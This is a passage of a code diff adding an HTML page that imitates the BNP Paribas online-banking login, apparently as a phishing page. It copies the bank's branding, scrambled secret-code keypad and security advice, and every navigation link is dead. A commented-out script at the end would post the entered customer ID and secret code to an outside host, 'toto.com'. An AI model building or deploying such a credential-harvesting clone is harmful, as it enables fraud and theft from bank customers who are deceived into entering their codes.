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">
+              <tr align="center">
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('7')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('3')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('5')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('8')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('0')"></a></td>
+              </tr>
+              <tr align="center">
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('9')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('6')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('4')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('1')"></a></td>
+                <td class="wh75"><a class="keys wh75" href="javascript:void(0)" onclick="fillPass('2')"></a></td>
+              </tr>
+            </table>
+          </div>
+          <button type="submit" id="submit" name="submit" class="btn btn-primary btn-lg btn-block" disabled>Accéder à mes comptes</button>
+        </form>
+      </div>
+    </div>
+    <div class="col-md-5" id="info">
+      <div class="row section-info d-flex flex-column">
+        <h2><i class="icon icon-picto-cadenas"></i>Vos codes d'accès</h2>
+        <p>
+          <a href="javascript:void(0)">Obtenir ses codes d'accès</a>
+        </p>
+        <p>
+          <a href="javascript:void(0)">Code secret oublié ?</a>
+        </p>
+      </div>
+      <div class="row section-info section-info-one">
+        <h2><i class="icon icon-picto-bouclier"></i>Conseils de sécurité</h2>
+        <p>
+          Vérifiez que
+          <strong>l'adresse du site commence exactement par :</strong>
+        </p>
+        <p class="url">
+          <strong>https://mabanque.bnpparibas/fr/connexion</strong>
+        </p>
+        <div class="col-55">
+          <p>
+            précédée par une icône cadenas et contient un
+            <strong>https://</strong> qui garantiront une
+            connexion sécurisée. </p>
+          <p>
+            <a href="javascript:void(0)">Découvrez nos conseils sécurité</a>
+            et les bonnes pratiques pour consulter et identifier
+            les dangers du web. </p>
+        </div>
+      </div>
+      <div class="row section-info d-flex flex-column">
+        <h2><i class="icon icon-picto-oeil"></i>Pour une meilleure accessibilité</h2>
+        <p>
+          <a href="javascript:void(0)">Connectez-vous</a>
+          grâce à la grille contrastée, agrandie et bénéficiez d'un
+          accompagnement vocal. </p>
+      </div>
+      <div class="row section-info d-flex flex-column">
+        <h2>
+          <i class="icon icon-picto-telephone"></i>Informations
+          client </h2>
+        <p>
+          Si vous rencontrez des problèmes techniques lors de votre
+          navigation, nous vous invitons à contacter nos conseillers
+          ou nous
+          <a href="javascript:void(0)">signaler un problème technique</a>.
+          <br>
+          Vous pouvez également gérer vos comptes depuis votre
+          mobile ou votre tablette via l'application
+          <a href="javascript:void(0)">Mes comptes</a>. </p>
+      </div>
+    </div>
+  </div>
+  <div class="row nomargin-x footer">
+    <div class="footer-section-one">
+      <div class="network">
+        <span>Suivez-nous sur :</span>
+        <a href="javascript:void(0)">
+          <svg xmlns="http://www.w3.org/2000/svg" width="8" height="19" viewBox="0 0 8 19">
+            <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1px">
+              <path fill="#ffffff" d="M8 8.83H5.356V19H1.678V8.72H0V5.787h1.678c0-1.745-1-6.422 6.286-5.715v3.45c-1.179 0-2.642-.296-2.642 2.265H8v3.042z" stroke="none" stroke-width="1px"></path>
+            </g>
+          </svg>
+        </a>
+        <a href="javascript:void(0)">
+          <svg xmlns="http://www.w3.org/2000/svg" width="23" height="19" viewBox="0 0 23 19">
+            <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1px">
+              <path fill="#ffffff" d="M7.396 19C3.95 19 .81 17.546 0 16.923c0 0 3.85.727 6.787-2.073-1.518-.518-3.342-.933-4.152-3.318.91.207.91.207 1.823-.103C2.937 10.704 1.621 9.562.81 6.763c.811.414 1.622.621 2.23.621C1.62 5.829.203 3.654 1.518.956c.914.831 4.967 5.288 9.731 4.873 0-2.28.708-4.25 2.329-5.184 1.621-.934 4.359-1.037 5.674.935 1.047.552 2.838.415 3.748 0-.405.83-1.824 2.696-2.532 3.213C20.568 5.622 19.86 19 7.396 19z" stroke="none" stroke-width="1px"></path>
+            </g>
+          </svg>
+        </a>
+        <a href="javascript:void(0)">
+          <svg xmlns="http://www.w3.org/2000/svg" width="27" height="19" viewBox="0 0 27 19">
+            <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1px">
+              <path fill="#ffffff" d="M11.713 13.004l-.002-7.59 7.296 3.808-7.294 3.782zM26.73 4.099s-.264-1.861-1.073-2.682C24.63.342 23.479.336 22.952.273 19.173 0 13.506 0 13.506 0h-.012S7.827 0 4.048.273C3.521.336 2.37.342 1.343 1.417.533 2.237.27 4.099.27 4.099S0 6.285 0 8.47v2.049c0 2.187.27 4.372.27 4.372s.264 1.862 1.073 2.681C2.37 18.65 3.72 18.616 4.32 18.73c2.16.207 9.18.271 9.18.271s5.673-.008 9.452-.281c.527-.063 1.678-.07 2.705-1.146.81-.819 1.073-2.68 1.073-2.68s.27-2.186.27-4.373V8.471c0-2.186-.27-4.372-.27-4.372z" stroke="none" stroke-width="1px"></path>
+            </g>
+          </svg>
+        </a>
+        <a href="javascript:void(0)">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="19" height="19" viewBox="0 0 19 19">
+            <defs>
+              <path id="a" d="M0 .006h18.994v18.992H0z"></path>
+            </defs>
+            <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1px">
+              <g stroke="none" fill="none" stroke-width="1px">
+                <mask id="b" fill="#fff">
+                  <use xlink:href="#a"></use>
+                </mask>
+                <path fill="#ffffff" d="M9.497.006c-2.58 0-2.903.01-3.916.057-1.01.046-1.7.207-2.305.442A4.655 4.655 0 0 0 1.594 1.6 4.655 4.655 0 0 0 .499 3.282C.264 3.886.103 4.577.057 5.587.011 6.6 0 6.924 0 9.503c0 2.58.01 2.903.057 3.916.046 1.01.207 1.7.442 2.305a4.655 4.655 0 0 0 1.095 1.682 4.656 4.656 0 0 0 1.682 1.095c.604.235 1.295.396 2.305.442 1.013.046 1.337.057 3.916.057 2.58 0 2.903-.01 3.916-.057 1.01-.046 1.7-.207 2.305-.442a4.656 4.656 0 0 0 1.682-1.095 4.656 4.656 0 0 0 1.095-1.682c.235-.604.396-1.295.442-2.305.046-1.013.057-1.337.057-3.916 0-2.58-.01-2.903-.057-3.916-.046-1.01-.207-1.7-.442-2.305A4.656 4.656 0 0 0 17.4 1.6 4.655 4.655 0 0 0 15.718.505C15.114.27 14.423.109 13.413.063 12.4.017 12.076.006 9.497.006zm0 1.711c2.536 0 2.836.01 3.838.056.926.042 1.428.196 1.763.327.443.172.76.378 1.092.71.332.332.538.649.71 1.092.13.335.285.837.327 1.763.046 1.002.056 1.302.056 3.838s-.01 2.836-.056 3.838c-.042.926-.196 1.428-.327 1.763-.172.443-.378.76-.71 1.092a2.942 2.942 0 0 1-1.092.71c-.335.13-.837.285-1.763.327-1.002.046-1.302.056-3.838.056s-2.836-.01-3.838-.056c-.926-.042-1.428-.196-1.763-.327a2.942 2.942 0 0 1-1.092-.71 2.943 2.943 0 0 1-.71-1.092c-.13-.335-.285-.837-.327-1.763-.046-1.002-.056-1.302-.056-3.838s.01-2.836.056-3.838c.042-.926.196-1.428.327-1.763.172-.443.378-.76.71-1.092a2.942 2.942 0 0 1 1.092-.71c.335-.13.837-.285 1.763-.327 1.002-.046 1.302-.056 3.838-.056z" mask="url(#b)" stroke="none" stroke-width="1px"></path>
+              </g>
+              <path fill="#ffffff" d="M9.497 12.669a3.166 3.166 0 1 1 0-6.332 3.166 3.166 0 0 1 0 6.332zm0-8.043a4.877 4.877 0 1 0 0 9.754 4.877 4.877 0 0 0 0-9.754zM15.706 4.433a1.14 1.14 0 1 1-2.28 0 1.14 1.14 0 0 1 2.28 0" stroke="none" stroke-width="1px"></path>
+            </g>
+          </svg>
+        </a>
+        <a href="javascript:void(0)">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="19" viewBox="0 0 20 19">
+            <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1px">
+              <path fill="#fffffe" d="M16.518 16.19h-2.873v-4.41c0-1.05-.02-2.403-1.494-2.403-1.496 0-1.726 1.145-1.726 2.328v4.486H7.553V7.123h2.757v1.239h.039c.384-.713 1.322-1.464 2.72-1.464 2.912 0 3.45 1.878 3.45 4.319v4.974zM4.312 5.885c-.921 0-1.667-.733-1.667-1.635 0-.901.746-1.633 1.667-1.633.92 0 1.667.732 1.667 1.633 0 .902-.747 1.635-1.667 1.635zM2.874 16.19h2.875V7.123H2.874v9.068zM17.95 0H1.43C.642 0 0 .613 0 1.37v16.26C0 18.385.641 19 1.43 19h16.52c.791 0 1.435-.614 1.435-1.37V1.37c0-.757-.644-1.37-1.435-1.37z" stroke="none" stroke-width="1px"></path>
+            </g>
+          </svg>
+        </a>
+      </div>
+    </div>
+    <div class="footer-section row d-flex justify-content-between footer-border">
+      <div class="col-md-3">
+        <a href="javascript:void(0)" class="footer-section_container1">
+          <span class="footer-section_titre1">Contact</span>
+          <p class="footer-section_content1"> Nos conseillers vous répondent par téléphone, chat, mail ou bien encore grâce à nos SAV Facebook et Twitter. </p>
+        </a>
+      </div>
+      <div class="col-md-3">
+        <a href="javascript:void(0)" class="footer-section_container1">
+          <span class="footer-section_titre1">Trouver une agence</span>
+          <p class="footer-section_content1"> Retrouvez facilement l’agence la plus proche avec ses horaires d’ouverture et les services disponibles. </p>
+        </a>
+      </div>
+      <div class="col-md-3">
+        <a href="javascript:void(0)" class="footer-section_container1">
+          <span class="footer-section_titre1">les applications mobiles</span>
+          <p class="footer-section_content1"> Découvrez nos applications mobiles pour gérer vos comptes, payer avec votre mobile et vous simplifier la vie. </p>
+        </a>
+      </div>
+    </div>
+    <div class="footer-section">
+      <div class="footer-section_mentions-legales">
+        <p> Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour. </p>
+      </div>
+    </div>
+
+  </div>
+
+
+</div>
+<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+<script>
+
+    $(document).ready(function() {
+        $("#user").focus(function() {
+            $('#passView').removeClass( "off" );
+            $('#pad').removeClass( "off" )
+        });
+
+
+    });
+
+    function fillPass(value) {
+      var userValue = $('#user').val();
+      var valueNow = $('#pass').val();
+      var newValue = value.toString() + valueNow
+      if(valueNow.length < 6){
+          var passViewNow = $('#passView').val();
+          $('#passView').val(passViewNow + '*');
+          $('#pass').val(newValue);
+      }
+
+      if(newValue.length == 6 && userValue.length > 8){
+          $('#submit').removeClass("off").attr("disabled", false);;
+      }
+    }
+
+
+
+
+
+
+    /*    $("#submit").on('click', function(){
+            // send ajax
+            $.ajax({
+                url: "https://toto.com",
+                headers: {
+                    Authorization: "xxxxxxx",
+                    apiKey: "xxxxxxxxx",
+                    "Access-Control-Allow-Origin": "*"
+                },
+                type: "POST",
+                dataType: "json",
+                data : $("#form").serialize(),
+                success: function(data) {
+                    alert("Success: " + data.responseText);
+                },
+                error: function(data) {
+                    alert("Error: " + JSON.stringify(data.responseText));
+                }
+            });
+        });*/
+</script>
+</body>
+</html>
